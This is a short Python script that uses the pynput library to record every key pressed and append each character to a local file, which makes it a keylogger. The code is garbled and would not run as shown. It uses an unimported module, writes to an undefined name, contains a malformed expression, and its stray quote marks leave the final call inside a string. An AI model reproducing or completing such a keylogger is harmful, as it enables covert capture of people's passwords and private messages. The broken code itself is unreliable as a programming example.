from pynput import keyboard
import os 

def start():
    with keyboard.Listener(on_press=on_key_press) as listener:
        print('Listening...')
        while True:
            time.sleep(0.125)
        
def on_key_press(key):
  
    if key is not None and type(key) == keyboard.KeyCode: 
      with open("log file","a") as logfile:
          log.write(str((key.char % ) + '\n'))
              '''''
start()
'''